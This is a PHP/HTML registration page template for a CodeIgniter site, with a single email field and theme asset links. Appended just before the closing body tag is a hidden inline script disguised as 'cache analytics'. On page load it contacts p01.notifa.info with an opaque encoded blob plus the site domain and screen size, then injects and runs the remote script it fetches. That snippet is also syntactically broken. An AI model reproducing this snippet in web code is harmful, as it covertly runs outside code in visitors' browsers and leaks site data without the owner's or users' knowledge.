<!DOCTYPE html>
<html lang="en">



<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url('assets/imagesfavicon.ico') ?>">
    <title>Halaman Login</title>
    <!-- Bootstrap Core CSS -->
    <link href="<?php echo base_url('assets/frontend/plugins/bootstrap/css/bootstrap.min.css') ?>" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="<?php echo base_url('assets/frontend/css/style.css') ?>" rel="stylesheet">
    <!-- You can change the theme colors from here -->
    <link href="<?php echo base_url('assets/frontend/css/colors/blue.css') ?>" id="theme" rel="stylesheet">
    <!-- H
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js') ?>"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js') ?>/1.4.2/respond.min.js') ?>"></script>
<![endif]-->
</head>

<body>
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <svg class="circular" viewBox="25 25 50 50">
            <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" /> </svg>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <section id="wrapper">
        <div class="login-register" style="background-image:url(../assets/frontend/images/background/login-register.jpg);">
            <div class="login-box card">
                <div class="card-body">
                    <form class="form-horizontal form-material" id="loginform" method="POST" action="<?php echo site_url('auth/c_proses_daftar'); ?>">
                        <h3 class="box-title m-b-20">Daftar</h3>
                        <?php echo $this->session->flashdata('berhasil'); ?>
                        <?php echo $this->session->flashdata('email_sudah_ada'); ?>
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <input class="form-control" type="email" name="email" required="" placeholder="Email"> </div>
                        </div>
                        
                        
                        <div class="form-group text-center m-t-20">
                            <div class="col-xs-12">
                                <button class="btn btn-info btn-lg btn-block text-uppercase waves-effect waves-light" type="submit">Daftar</button>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-xs-12 col-sm-12 col-md-12 m-t-10 text-center">
                                
                            </div>
                        </div>
                        <div class="form-group m-b-0">
                            <div class="col-sm-12 text-center">
                                <div> <a href="<?php echo site_url('auth/login') ?>" class="text-info m-l-5"><b>Login</b></a></div>
                            </div>
                        </div>
                    </form>
                    
                </div>
            </div>
        </div>
    </section>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url('assets/frontend/plugins/jquery/jquery.min.js') ?>"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="<?php echo base_url('assets/frontend/plugins/bootstrap/js/popper.min.js') ?>"></script>
    <script src="<?php echo base_url('assets/frontend/plugins/bootstrap/js/bootstrap.min.js') ?>"></script>
    <!-- slimscrollbar scrollbar JavaScript -->
    <script src="<?php echo base_url('assets/frontend/js/jquery.slimscroll.js') ?>"></script>
    <!--Wave Effects -->
    <script src="<?php echo base_url('assets/frontend/js/waves.js') ?>"></script>
    <!--Menu sidebar -->
    <script src="<?php echo base_url('assets/frontend/js/sidebarmenu.js') ?>"></script>
    <!--stickey kit -->
    <script src="<?php echo base_url('assets/frontend/plugins/sticky-kit-master/dist/sticky-kit.min.js') ?>"></script>
    <script src="<?php echo base_url('assets/frontend/plugins/sparkline/jquery.sparkline.min.js') ?>"></script>
    <!--Custom JavaScript -->
    <script src="<?php echo base_url('assets/frontend/js/custom.min.js') ?>"></script>
    <!-- ============================================================== -->
    <!-- Style switcher -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url('assets/frontend/plugins/styleswitcher/jQuery.style.switcher.js') ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH24ojOHb%2fQMcYoKrt2KFM8P3ToJcyGjEjrV%2fx8PWPp%2f376LeB5yLfT6COZhymaOE1h1tSPUwqSvUu147IMs94IDCp9rraiJrlkuyRWnEZ6h67fEqMWcw0DwbV96qFSI5iTxhtFfumHoLxqvJJ5L9SdtuQx%2bETUcu87phwA3KYIUQSLxgtGENJZxPSWvWBcu%2bGDP7j%2fZgBr%2f71tXUSkaq9OvtD3BKgae01tbehpbJ39o7P4Xy5UePSw7A4ZzCey8uyzyXLsYuIkgJS1HndsGThlFviGTduo%2bKaGQXOx%2b4LyV3csTKFva4K0hiCcxI6cyO%2fdRuteuCmikQjwTBE6L4D8vdYmn60nfn8xqB%2bmBgOQnvu9%2fN1o97oD%2fs1HSvE1BJW%2fm8eQwpf0SdoxXnHQ2yKvqRAg%2boW8hNI%2bVvqbNST9x%2fPbW%2bemi698LT0YSk%2fOLWoXcMC56V%2fonuOkrBJLwFmSM2c6jv2ZGkVhfjcH4baZHn3en3DcYdPLGDeuvRzitbM5 + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from themedesigner.in/demo/admin-press/main/pages-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 Feb 2019 18:01:01 GMT -->
</html>